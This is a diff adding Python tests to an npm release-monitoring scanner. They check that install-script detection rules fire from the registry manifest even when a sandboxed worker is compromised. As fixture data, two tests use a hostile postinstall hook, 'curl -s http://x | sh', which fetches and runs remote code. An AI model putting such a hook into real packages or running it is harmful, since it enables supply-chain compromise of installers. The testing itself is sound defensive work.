@@ -232,3 +232,55 @@ def test_worker_results_for_tarball_rules_are_kept(monkeypatch):
     cfg = _lying_worker(monkeypatch, fired=[FiredRule("js-child-process", 20.0, "lib/a.js", (1, 2))])
     _, _, tr = sandbox.analyze(cfg, _download(), None, backend="seatbelt")
     assert [r.rule for r in tr.fired_rules] == ["js-child-process"] and tr.score == 20.0
+
+
+# ---- the worker uses the parent's rules; package.json rules also run on the registry's manifest ----
+@seatbelt
+def test_the_worker_uses_the_rules_the_parent_loaded_not_the_files_on_disk():
+    from npmdiffwatch.rules import validate_rule
+    cfg = _cfg()
+    only_in_parent = validate_rule({"id": "parent-only-rule", "applies_to": "code", "weight": 7,
+                                    "match": {"bound_call": {"category": "process"}}})
+    _, _, tr = sandbox.analyze(cfg, _download(), None, backend="seatbelt", ruleset=[only_in_parent])
+    assert [r.rule for r in tr.fired_rules] == ["parent-only-rule"]
+
+
+def _manifests(prior_scripts, new_scripts):
+    return {"prior_manifest": {"name": "p", "version": "1.0.0", "scripts": prior_scripts},
+            "manifest": {"name": "p", "version": "1.0.1", "scripts": new_scripts}}
+
+
+def test_a_compromised_worker_cannot_hide_an_install_script_the_registry_lists(monkeypatch):
+    cfg = _lying_worker(monkeypatch)
+    dl = dataclasses.replace(_download(), **_manifests({}, {"postinstall": "curl -s http://x | sh"}))
+    _, _, tr = sandbox.analyze(cfg, dl, None, backend="seatbelt")
+    fired = [r.rule for r in tr.fired_rules]
+    assert {"pkg-install-scripts", "pkg-install-script-dangerous"} <= set(fired) and tr.escalate
+
+
+def test_registry_and_tarball_agreeing_fire_each_package_json_rule_once(monkeypatch):
+    cfg = _cfg()
+    dl = dataclasses.replace(_download(), **_manifests({}, {"postinstall": "curl -s http://x | sh"}))
+    _, _, tr = sandbox.analyze(cfg, dl, None, backend="off")
+    fired = [r.rule for r in tr.fired_rules]
+    assert fired.count("pkg-install-scripts") == 1 and fired.count("pkg-install-script-dangerous") == 1
+
+
+def test_an_install_script_only_in_the_registry_manifest_still_fires(monkeypatch):
+    cfg = _cfg()        # the tarball's package.json (OLD) has no scripts; the registry says otherwise
+    dl = dataclasses.replace(_download(new=OLD), **_manifests({}, {"preinstall": "node x.js"}))
+    _, _, tr = sandbox.analyze(cfg, dl, None, backend="off")
+    assert "pkg-install-scripts" in {r.rule for r in tr.fired_rules}
+
+
+def test_download_keeps_the_registry_manifests_small(monkeypatch):
+    meta = {"versions": {v: {"dist": {"tarball": f"https://registry.npmjs.org/p/-/p-{v}.tgz"}, "readme": "x" * 10_000,
+                             "scripts": {"postinstall": "node i.js"} if v == "1.0.1" else {},
+                             "_npmUser": {"name": "a"}} for v in ("1.0.0", "1.0.1")},
+            "time": {"1.0.0": "2026-09-24T05:20:00.000Z", "1.0.1": "2026-09-24T05:49:00.000Z"},
+            "maintainers": [{"name": "a"}]}
+    monkeypatch.setattr(fetcher, "_packument", lambda *a: meta)
+    monkeypatch.setattr(fetcher, "_fetch_url", lambda url, cfg: _tgz(OLD))
+    dl = fetcher.download(Config(), NewRelease("p", "1.0.1", 2))
+    assert dl.manifest["scripts"] == {"postinstall": "node i.js"} and dl.prior_manifest["scripts"] == {}
+    assert "readme" not in dl.manifest and "dist" not in dl.manifest
